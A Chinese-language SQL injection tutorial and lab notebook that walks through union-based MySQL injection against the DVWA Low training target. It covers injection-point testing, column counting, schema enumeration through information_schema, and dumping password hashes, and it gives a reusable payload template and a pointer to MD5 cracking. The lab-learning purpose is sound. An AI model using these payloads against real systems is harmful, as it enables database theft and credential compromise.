# SQL 注入入门 — MySQL 基础注入

## 一、什么是 SQL 注入

用户输入的数据被拼接到 SQL 语句中执行，导致攻击者可以操纵数据库查询。

### 一句话理解

```php
// 开发人员的本意
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id'";
// 用户输入: 1
// → SELECT * FROM users WHERE id='1'  ✅ 正常

// 攻击者的输入
// 用户输入: 1' or '1'='1
// → SELECT * FROM users WHERE id='1' or '1'='1'
// 永远为真，查出所有用户 ❌ 被注入
```

---

## 二、注入前信息搜集

在动手注入之前，先搞清楚目标的基本信息：

| 搜集项 | 方法 | 为什么要知道 |
|--------|------|-------------|
| **数据库类型** | 报错信息、端口（3306=MySQL）、指纹特征 | 不同数据库语法不同 |
| **注入点位置** | 逐个参数测试 `'` `"` `)` | 找到哪个参数可注入 |
| **参数类型** | 数字还是字符串？有无引号？ | 决定闭合方式 |
| **WAF 是否存在** | wafw00f 检测、发恶意 payload 观察拦截 | 决定是否需要绕过 |

### 常见数据库端口

```
MySQL     3306
MSSQL     1433
Oracle    1521
PostgreSQL 5432
MongoDB   27017
Redis     6379
```

---

## 三、MySQL 注入核心语法

### 3.1 注释符

```sql
--+     或   #   或   -- （加空格）
```
作用是"吃掉" SQL 语句末尾多余的引号或括号。

### 3.2 基本探测函数

```sql
database()       -- 获取当前数据库名
version()        -- MySQL 版本
user()           -- 当前数据库用户
@@version_compile_os  -- 操作系统
```

### 3.3 数据字典（information_schema）

MySQL 自带的元数据库，记录了整个 MySQL 实例的所有库、表、列：

```sql
-- 查所有库
SELECT schema_name FROM information_schema.schemata;

-- 查某库的所有表
SELECT table_name FROM information_schema.tables
WHERE table_schema='dvwa';

-- 查某表的所有列
SELECT column_name FROM information_schema.columns
WHERE table_name='users';
```

### 3.4 聚合函数

```sql
group_concat(字段名)   -- 把多行结果拼成一行字符串
```

不用这个函数的话，`union select` 只显示一行结果。

---

## 四、注入五步法（DVWA Low 难度实战）

### 环境

- 靶场：DVWA Low
- 页面：一个输入框，输入 User ID 查询用户信息
- 正常输入 `1` → 返回 `admin / admin`

### 第一步：测试注入点

```
输入: 1'
```

→ 页面报错 `You have an error in your SQL syntax...`

**结论：存在字符型 SQL 注入，参数被单引号包裹。**

### 第二步：测字段数

```
1' order by 1 #   → 正常 ✅（至少 1 个字段）
1' order by 2 #   → 正常 ✅（至少 2 个字段）
1' order by 3 #   → 报错 ❌（没有第 3 个字段）
```

**结论：原查询有 2 个字段。**

### 第三步：找数据显示位

```
-1' union select 1,2 #
```

`-1` 让原查询查不到结果，`union select 1,2` 被拼接后显示在页面上。

→ `First name: 1  Surname: 2`

**结论：两个位置都能显示数据。**

### 第四步：爆库 → 爆表 → 爆列

```sql
-- 爆数据库名
-1' union select 1, database() #
-- → dvwa

-- 爆所有表名
-1' union select 1, group_concat(table_name)
from information_schema.tables where table_schema='dvwa' #
-- → guestbook, users

-- 爆 users 表的所有列名
-1' union select 1, group_concat(column_name)
from information_schema.columns where table_name='users' #
-- → user_id, first_name, last_name, user, password, avatar
```

### 第五步：脱数据

```sql
-1' union select user, password from users #
-- → admin / 5f4dcc3b5aa765d61d8327deb882cf99
-- → gordonb / e99a18c428cb38d5f260853678922e03
-- → ...
```

密码是 MD5 加密的，可以去 [cmd5.com](https://cmd5.com) 在线破解。

---

## 五、字符串型注入通用模板

```sql
-- 一、闭合注入
?id=1' --+

-- 二、测字段数（N 递增直到报错）
?id=1' order by N --+

-- 三、找显示位（M = 上一步测出的字段数）
?id=-1' union select 1,2,...,M --+

-- 四、爆库
?id=-1' union select 1,database(),...,M --+

-- 五、爆表
?id=-1' union select 1,group_concat(table_name),...,M
  from information_schema.tables where table_schema='库名' --+

-- 六、爆列
?id=-1' union select 1,group_concat(column_name),...,M
  from information_schema.columns where table_name='表名' --+

-- 七、爆数据
?id=-1' union select col1,col2,...,colN from 表名 --+
```

---

## 六、数字型 vs 字符型注入

| 类型 | SQL 后端写法 | 注入示例 |
|------|-------------|----------|
| **数字型** | `WHERE id=$id` | `?id=1 union select 1,2` |
| **字符型** | `WHERE id='$id'` | `?id=1' union select 1,2 --+` |

区别：字符型需要**先闭合引号**，数字型不需要。

### 怎么判断是哪种？

```
数字型测试: ?id=1'   → 如果数字型，' 会导致非数字报错
字符型测试: ?id=1'   → 如果字符型，会闭合引号导致语法报错
单引号测试: ?id=1\'  → 逃逸引号，观察响应变化
```

**DVWA Low 是字符型**，因为输入 `1'` 直接报 SQL 语法错误。

---

## 七、今日实操总结

| 步骤 | 语法 | 学到什么 |
|------|------|----------|
| 测注入点 | `1'` | 单引号破坏 SQL 语法 → 确认注入存在 |
| 测字段数 | `order by N` | 二分法确定原查询有几个字段 |
| 测显示位 | `union select 1,2` | 确定能回显的位置，把"偷"的数据放这里 |
| 爆库 | `database()` | 知道当前在哪个数据库 |
| 爆表 | `information_schema.tables` | 数据字典是"数据库的目录" |
| 爆列 | `information_schema.columns` | 知道表有哪些字段才能精准取数据 |
| 爆密码 | `union select user,password from users` | 获取敏感数据 |
| 注释符 | `--+` 或 `#` | 吃掉多余引号的关键技巧 |

---

## 八、下一步

- [ ] DVWA Medium 难度注入（POST 方式，需要抓包）
- [ ] DVWA High 难度注入（分页显示，思路不变）
- [ ] SQLi-Labs Less-2 ~ Less-10（各种注入类型）
- [ ] 学习 SQLMap 自动化注入工具
